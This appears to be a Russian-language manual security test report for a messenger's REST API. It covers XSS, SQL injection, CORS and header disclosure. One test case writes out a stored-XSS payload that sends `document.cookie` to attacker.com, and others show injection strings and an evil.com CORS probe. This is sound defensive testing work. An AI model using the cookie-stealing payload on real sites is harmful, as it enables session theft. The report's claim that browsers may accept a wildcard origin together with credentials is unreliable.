# Отчёт: API Security Testing (ручное тестирование)  

## Что тестируем
Безопасность REST API мессенджера:
- устойчивость к XSS, SQL-инъекциям,
- корректность CORS и заголовков,
- раскрытие информации.

### Цель 
Выявить уязвимости, которые могут быть использованы для кражи данных, выполнения произвольного кода или отправки сообщений от имени пользователя.

---

## Предусловия
- Запущен MySQL (`127.0.0.1:3306`, БД `messenger`),
- Запущен бэкенд: `uvicorn app.main:app --port 8000`,
- Использован `curl` для отправки запросов,
- Проверены домены `attacker.com` и `evil.com` — оба существуют и доступны.

---

## Тест-кейсы

| № | Действие | Команда / Запрос | Ответ / Наблюдение | Статус |
|---|----------|------------------|---------------------|--------|
| 1 | XSS через `content` (exfiltration) | `POST /messages/send`<br>`{"content":"<img src=x onerror=fetch(\"https://attacker.com?cookie=\"+document.cookie)>"}'}` | `200 OK`,<br>в БД: строка сохранена **как есть** | 🟥 Критично |
| 2 | XSS через `username` | `POST /register`<br>`{"username":"<svg onload=alert(1)>user", ...}` | `200 OK`,<br>в БД: `username` содержит `<svg...>` | 🟥 Критично |
| 3 | SQL-инъекция в path | `GET /chats/1%27%20OR%20%271%27=%271%27--` | `422` с сообщением `Input should be a valid integer` | ✅ Защищено |
| 4 | Проверка CORS | `curl -H "Origin: https://evil.com" -I /register` | Заголовки:<br>`access-control-allow-origin: *`<br>`access-control-allow-credentials: true` | 🟥 Критично |
| 5 | Раскрытие сервера | `curl -I /register` | `server: uvicorn` | 🟨 Серьёзно |

---

## Анализ

### 1. XSS (критично)
- Любое поле (`content`, `username`, `chat_name`) принимает HTML/JS без санитизации.

### 2. CORS + CSRF (критично)
- Комбинация `allow-origin: *` + `allow-credentials: true` нарушает спецификацию CORS, но браузеры могут разрешить такие запросы при определённых условиях.